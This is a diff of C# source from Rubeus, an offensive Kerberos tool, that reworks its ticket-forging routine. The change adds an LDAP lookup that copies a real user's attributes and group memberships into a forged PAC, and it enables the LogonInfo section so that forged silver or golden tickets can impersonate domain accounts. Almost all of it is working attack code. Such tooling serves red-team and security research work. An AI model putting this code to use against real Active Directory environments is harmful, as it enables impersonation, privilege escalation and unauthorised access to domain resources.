@@ -1,52 +1,21 @@
 ﻿using System;
 using System.Text;
+using System.Security.Principal;
+using System.Collections.Generic;
+using System.DirectoryServices;
 using Rubeus.lib.Interop;
 using Rubeus.Kerberos.PAC;
 using Rubeus.Kerberos;
-using Rubeus.Ndr;
-using System.Collections.Generic;
 
 namespace Rubeus
 {
-    public class ForgeTicket
+    public class ForgeTickets
     {
-        public static void Silver(string user, string sname, string keyString, Interop.KERB_ETYPE etype, string sid, string domain = "", int uid = 500, string outfile = null, bool ptt = false, Interop.TicketFlags flags = Interop.TicketFlags.forwardable | Interop.TicketFlags.renewable | Interop.TicketFlags.pre_authent)
+        public static void ForgeTicket(string user, string sname, string keyString, Interop.KERB_ETYPE etype, bool fromldap = false, string sid = "", string domain = "", string domainController = "", int uid = 500, string outfile = null, bool ptt = false, Interop.TicketFlags flags = Interop.TicketFlags.forwardable | Interop.TicketFlags.renewable | Interop.TicketFlags.pre_authent)
         {
-            UnicodeEncoding unicode = new UnicodeEncoding();
-            // temp vars for LogonInfo section
-            /*
-            _FILETIME testTime = new _FILETIME();
-            byte[] userBytes = Encoding.Unicode.GetBytes(user);
-            _RPC_UNICODE_STRING pacUser = new _RPC_UNICODE_STRING((short)unicode.GetCharCount(userBytes), (short)unicode.GetMaxCharCount(unicode.GetCharCount(userBytes)), unicode.GetChars(userBytes));
-            int pgid = 513;
-            int[] gids = { 513, 512, 520, 518, 519 };
-            _GROUP_MEMBERSHIP[] pacGids = new _GROUP_MEMBERSHIP[gids.Length];
-            for (int i = 0; i < gids.Length; i++)
-            {
-                pacGids[i] = new _GROUP_MEMBERSHIP(gids[i], 0);
-            }
-            Interop.PacUserFlags userFlags = Interop.PacUserFlags.EXTRA_SIDS;
-            string dcName = "DC1";
-            byte[] dcNameBytes = Encoding.Unicode.GetBytes(dcName);
-            _RPC_UNICODE_STRING pacDcName = new _RPC_UNICODE_STRING((short)unicode.GetCharCount(dcNameBytes), (short)unicode.GetMaxCharCount(unicode.GetCharCount(dcNameBytes)), unicode.GetChars(dcNameBytes));
-            string netbiosName = null;
-            Interop.PacUserAccountControl pacUAC = Interop.PacUserAccountControl.NORMAL_ACCOUNT;
-            string[] sids = { "S-1-18-1" };
-            _RPC_UNICODE_STRING emptyString = new _RPC_UNICODE_STRING();
-            _USER_SESSION_KEY pacSess = new _USER_SESSION_KEY();
-            pacSess.data = new _CYPHER_BLOCK[2];
-            pacSess.data[0].data = new sbyte[8] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
-            pacSess.data[1].data = new sbyte[8] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
-            char[] sidArr = sid.ToCharArray();
-            int[] sidInt = new int[sidArr.Length];
-            for (int i = 0; i < sidArr.Length; i++)
-            {
-                sidInt[i] = Convert.ToInt32(sidArr[i]);
-            }
-            _RPC_SID pacSid = new _RPC_SID(0x01, 0x01, new _RPC_SID_IDENTIFIER_AUTHORITY(new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x05 }), sidInt);
-            pacSid.SubAuthorityCount = 1;
-            pacSid.IdentifierAuthority.Value = new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x05 };
-            _KERB_SID_AND_ATTRIBUTES[] pacSids = new _KERB_SID_AND_ATTRIBUTES[0];*/
+            // initialise LogonInfo section
+            var kvi = Ndr._KERB_VALIDATION_INFO.CreateDefault();
+            kvi.UserSessionKey = Ndr._USER_SESSION_KEY.CreateDefault();
 
             // determine domain if not supplied
             string[] parts = sname.Split('/');
@@ -81,24 +50,177 @@ namespace Rubeus
                     return;
                 }
             }
-            /*if (String.IsNullOrEmpty(netbiosName))
+
+            // if /fromldap was passed make the LDAP query
+            if (fromldap)
             {
-                netbiosName = domain.Substring(0, domain.IndexOf('.')).ToUpper();
+                DirectoryEntry directoryObject = null;
+                DirectorySearcher userSearcher = null;
+
+                try
+                {
+                    if (String.IsNullOrEmpty(domainController))
+                    {
+                        domainController = Networking.GetDCName(domain); //if domain is null, this will try to find a DC in current user's domain
+                    }
+                    directoryObject = Networking.GetLdapSearchRoot(null, "", domainController, domain);
+                    userSearcher = new DirectorySearcher(directoryObject);
+                    // enable LDAP paged search to get all results, by pages of 1000 items
+                    userSearcher.PageSize = 1000;
+                }
+                catch (Exception ex)
+                {
+                    if (ex.InnerException != null)
+                    {
+                        Console.WriteLine("\r\n[X] Error creating the domain searcher: {0}", ex.InnerException.Message);
+                    }
+                    else
+                    {
+                        Console.WriteLine("\r\n[X] Error creating the domain searcher: {0}", ex.Message);
+                    }
+                    return;
+                }
+
+                try
+                {
+                    string userSearchFilter = "";
+
+                    userSearchFilter = String.Format("(&(samAccountName={0}))", user);
+                    userSearcher.Filter = userSearchFilter;
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine("\r\n[X] Error settings the domain searcher filter: {0}", ex.InnerException.Message);
+                    return;
+                }
+
+                try
+                {
+                    SearchResultCollection users = userSearcher.FindAll();
+
+                    if (users.Count == 0)
+                    {
+                        Console.WriteLine("[X] No users returned by LDAP!");
+                        return;
+                    }
+
+                    foreach (SearchResult u in users)
+                    {
+                        kvi.EffectiveName = new Ndr._RPC_UNICODE_STRING(u.Properties["samAccountName"][0].ToString());
+                        kvi.FullName = new Ndr._RPC_UNICODE_STRING(u.Properties["name"][0].ToString());
+                        string objectSid = (new SecurityIdentifier((byte[])u.Properties["objectsid"][0], 0)).Value;
+                        string domainSid = objectSid.Substring(0, objectSid.LastIndexOf('-'));
+                        kvi.LogonDomainId = new Ndr._RPC_SID(new SecurityIdentifier(domainSid));
+                        kvi.LogonCount = short.Parse(u.Properties["logoncount"][0].ToString());
+                        kvi.BadPasswordCount = short.Parse(u.Properties["badpwdcount"][0].ToString());
+                        kvi.LogonTime = new Ndr._FILETIME(DateTime.FromFileTime((long)u.Properties["lastlogon"][0]));
+                        kvi.LogoffTime = new Ndr._FILETIME(DateTime.FromFileTime((long)u.Properties["lastlogoff"][0]));
+                        kvi.PasswordLastSet = new Ndr._FILETIME(DateTime.FromFileTime((long)u.Properties["pwdlastset"][0]));
+                        kvi.PrimaryGroupId = (int)u.Properties["primarygroupid"][0];
+                        kvi.UserId = Int32.Parse(objectSid.Substring(objectSid.LastIndexOf('-')+1));
+                        kvi.LogonServer = new Ndr._RPC_UNICODE_STRING(domainController.Substring(0, domainController.IndexOf('.')).ToUpper());
+                        if (u.Properties["homedirectory"].Count > 0)
+                        {
+                            kvi.HomeDirectory = new Ndr._RPC_UNICODE_STRING(u.Properties["homedirectory"][0].ToString());
+                        }
+                        if (u.Properties["homedrive"].Count > 0)
+                        {
+                            kvi.HomeDirectoryDrive = new Ndr._RPC_UNICODE_STRING(u.Properties["homedrive"][0].ToString());
+                        }
+                        if (u.Properties["profilepath"].Count > 0)
+                        {
+                            kvi.ProfilePath = new Ndr._RPC_UNICODE_STRING(u.Properties["profilepath"][0].ToString());
+                        }
+                        if (u.Properties["scriptpath"].Count > 0)
+                        {
+                            kvi.ProfilePath = new Ndr._RPC_UNICODE_STRING(u.Properties["scriptpath"][0].ToString());
+                        }
+
+                        kvi.GroupCount = u.Properties["memberof"].Count;
+                        kvi.GroupIds = new Ndr._GROUP_MEMBERSHIP[u.Properties["memberof"].Count];
+                        int c = 0;
+                        if (u.Properties["memberof"].Count > 0)
+                        {
+                            try
+                            {
+                                string groupSearchFilter = "";
+                                foreach (string groupDN in u.Properties["memberof"])
+                                {
+                                    groupSearchFilter += String.Format("(distinguishedname={0})", groupDN);
+                                }
+                                userSearcher.Filter = String.Format("(|{0})", groupSearchFilter);
+                            }
+                            catch (Exception ex)
+                            {
+                                Console.WriteLine("\r\n[X] Error settings the domain searcher filter: {0}", ex.InnerException.Message);
+                                return;
+                            }
+
+                            try
+                            {
+                                SearchResultCollection groups = userSearcher.FindAll();
+
+                                if (groups.Count == 0)
+                                {
+                                    Console.WriteLine("[X] No groups returned by LDAP!");
+                                    return;
+                                }
+
+                                foreach (SearchResult g in groups)
+                                {
+                                    string groupSid = (new SecurityIdentifier((byte[])g.Properties["objectsid"][0], 0)).Value;
+                                    int groupId = Int32.Parse(groupSid.Substring(groupSid.LastIndexOf('-') + 1));
+                                    Array.Copy(new Ndr._GROUP_MEMBERSHIP[] { new Ndr._GROUP_MEMBERSHIP(groupId, 0) }, 0, kvi.GroupIds, c, 1);
+                                    c += 1;
+                                }
+                            }
+                            catch (Exception ex)
+                            {
+                                if (ex.InnerException != null)
+                                {
+                                    Console.WriteLine("\r\n[X] Error executing the domain searcher: {0}", ex.InnerException.Message);
+                                }
+                                else
+                                {
+                                    Console.WriteLine("\r\n[X] Error executing the domain searcher: {0}", ex.Message);
+                                }
+                                return;
+                            }
+                        }
+
+                        /*Console.WriteLine("[*] SamAccountName         : {0}", u.Properties["samAccountName"][0].ToString());
+                        Console.WriteLine("[*] Domain SID             : {0}", domainSid);
+                        Console.WriteLine("[*] Last Logon             : {0}", DateTime.FromFileTime((long)u.Properties["lastlogon"][0]));*/
+                    }
+                }
+                catch (Exception ex)
+                {
+                    if (ex.InnerException != null)
+                    {
+                        Console.WriteLine("\r\n[X] Error executing the domain searcher: {0}", ex.InnerException.Message);
+                    }
+                    else
+                    {
+                        Console.WriteLine("\r\n[X] Error executing the domain searcher: {0}", ex.Message);
+                    }
+                    return;
+                }
+
             }
-            byte[] pacNetbiosName = unicode.GetBytes(netbiosName);
-            _RPC_UNICODE_STRING pacUniNetbiosName = new _RPC_UNICODE_STRING((short)unicode.GetCharCount(pacNetbiosName), (short)unicode.GetMaxCharCount(unicode.GetCharCount(pacNetbiosName)), unicode.GetChars(pacNetbiosName));
-            */
 
             // initialize some structures
             KRB_CRED cred = new KRB_CRED();
             KrbCredInfo info = new KrbCredInfo();
 
-            // generate PAC sections
-            /*LogonInfo li = new LogonInfo();
-            li.KerbValidationInfo = new _KERB_VALIDATION_INFO(
-                testTime, testTime, testTime, testTime, testTime, testTime, pacUser, pacUser,
-                emptyString, emptyString, emptyString, emptyString, 1, 0, uid, pgid, gids.Length, pacGids, (int)userFlags, pacSess, pacDcName,
-                pacUniNetbiosName, pacSid, new int[0], (int)pacUAC, new int[0], pacSids.Length, pacSids, null, 0, null);*/
+            // overwrite any LogonInfo fields here sections
+            kvi.LogonDomainName = new Ndr._RPC_UNICODE_STRING("CHOCOLATE");
+            kvi.UserAccountControl = 528;
+            kvi.UserFlags = 544;
+            kvi.SidCount = 1;
+            kvi.ExtraSids = new Ndr._KERB_SID_AND_ATTRIBUTES[] {
+                    new Ndr._KERB_SID_AND_ATTRIBUTES(new Ndr._RPC_SID(new SecurityIdentifier("S-1-18-1")), 0)};
+            LogonInfo li = new LogonInfo(kvi);
+
 
             ClientName cn = new ClientName(DateTime.Now, user);
             SignatureData svrSigData = new SignatureData(PacInfoBufferType.ServerChecksum);
@@ -142,7 +264,7 @@ namespace Rubeus
 
             // add sections to the PAC, get bytes and generate checksums
             List<PacInfoBuffer> PacInfoBuffers = new List<PacInfoBuffer>();
-            //PacInfoBuffers.Add(li);
+            PacInfoBuffers.Add(li);
             PacInfoBuffers.Add(cn);
             PacInfoBuffers.Add(svrSigData);
             PacInfoBuffers.Add(kdcSigData);
@@ -155,7 +277,7 @@ namespace Rubeus
             svrSigData.Signature = svrSig;
             kdcSigData.Signature = kdcSig;
             PacInfoBuffers = new List<PacInfoBuffer>();
-            //PacInfoBuffers.Add(li);
+            PacInfoBuffers.Add(li);
             PacInfoBuffers.Add(cn);
             PacInfoBuffers.Add(svrSigData);
             PacInfoBuffers.Add(kdcSigData);
